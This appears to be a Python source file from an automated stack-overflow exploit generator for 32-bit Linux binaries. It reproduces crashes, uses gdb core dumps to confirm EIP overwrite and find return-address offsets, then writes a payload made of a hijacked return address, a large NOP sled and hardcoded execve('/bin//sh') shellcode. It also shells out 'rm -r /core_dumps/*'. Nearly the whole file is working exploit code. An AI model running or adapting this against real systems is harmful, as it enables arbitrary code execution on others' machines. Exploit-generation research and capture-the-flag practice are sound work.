from pwn import *
from utils import cleanup, build_command
from exploit_utils import ENV_VARS
import argparse
import glob


def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
    """
    Validates that the input causes a memory corruption crash by reproducing that crash.

    Parameters:
    crash_input: Initial input that will cause a memory corruption crash.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the program crashes with a segmentation fault.
    """

    #clear the /core_dumps directory for a clean start
    subprocess.Popen(
        "rm -r /core_dumps/*", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE,
        shell=True
    )

    target_bin = arg_config.target

    command = build_command(arg_config, crash_input)

    rep_proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True
    )

    #sending the crash input from stdin to all targets
    rep_proc.communicate(input=crash_input.decode())

    if rep_proc.returncode == -11:  #segfault
        core_path = f"/core_dumps/core.{target_bin}.{rep_proc.pid}"

        if os.path.isfile(core_path):
            os.remove(core_path)
            return True

        else:
            logging.error("Core dump is missing; Something went wrong.")
            sys.exit(1)

    else:
        logging.error("No memory corruption crash detected")
        sys.exit(1)


def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
    """
    Triggers a test crash with the given input and extracts information from the resulting core dump.
    Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
    the return address, causing EIP hijacking.

    Parameters:
    crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the payload successfully reached and affected the return address.
    """

    #performs the crash 
    target_bin = arg_config.target

    command = build_command(arg_config, crash_input)

    crash_proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True
    )

    #sending the crash input from stdin to all targets
    crash_proc.communicate(input=crash_input.decode())

    core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target_bin} {core_path}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    # print(f'from root cause analysis, output: {output}')

    eip = extract_eip(output)

    #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
    if eip in crash_input:    
        return True

    #eip still has a valid value, so it wasn't overwritten by the payload. The program prematurel ycrashed and it did not reach the return address
    else:
        return False


def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
    """
    Extracts information from the core dump from the previous crash and mutates the crashing input, 
    returns the mutated input to the root_cause_analysis for further crash testing.
    """
    payload_mutation = []

    return payload_mutation

def payload_builder(crash_input: bytes, target_bin: str):
    """
    Generates the final payload (byte sequence) for the exploitation process and writes it to a file.
    Overwrites the bytes that fall on the return address with a valid target address on the existing crash input, 
    appends a nopsled and finally the shellcode.

    Parameters:
    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
    target_bin: The binary file we want to exploit.

    """

    target_address = stack_middle_address(target_ra(target_bin))
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    payload = overwrite_ra(crash_input, target_bin, struct.pack("<I", target_address))
    payload += b'\x90' * 129000
    payload += shellcode

    open("payload", "wb").write(payload)

    return

def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
    """
    Rewrites a crashing input to replace the return address for EIP hijacking. 
    The function extracts the EIP from a core dump, verifies it is present in the input, 
    and replaces it with the target return address.

    Parameters:
    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
    target_bin: The binary file we want to exploit.
    target_ra: The new return address to overwrite.
    """

    core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
    core_path = core_files[-1]

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target_bin} {core_path}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    eip = extract_eip(output)

    if eip not in crash_input:
        logging.error('Houston we have a problem')
    
    payload = crash_input.replace(eip, target_ra)

    return payload


def extract_eip(core_output: str):

    eip_value = None
    for line in core_output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    
    if eip_value.startswith("0x"):  #remove 0x prefix
        eip_value = eip_value[2:]

    eip_bytes = bytes.fromhex(eip_value)    #convert to hex bytes
    eip_bytes = eip_bytes[::-1] 

    return eip_bytes


def locate_ra(pattern, target):

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    #send the pattern to the gdb target proc from both the arguments and stdin 
    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
    commands = f"""
    set pagination off
    set disable-randomization off
    r {pattern.decode('latin-1')}
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("info frame\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("x/40x $esp-1100\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    offset = cyclic_find(int(eip_value, 16))
    return offset


def target_ra(target_bin: str):

    #find in what adresses the stack fluctuates -> info proc mapping

    gdb_process = subprocess.Popen(
        f"gdb {target_bin}", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True, 
        shell=True,
        env={**os.environ, **ENV_VARS}
    )

    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output



def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        logging.error("GDB failed to find the stack line.")
        cleanup(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    return middle
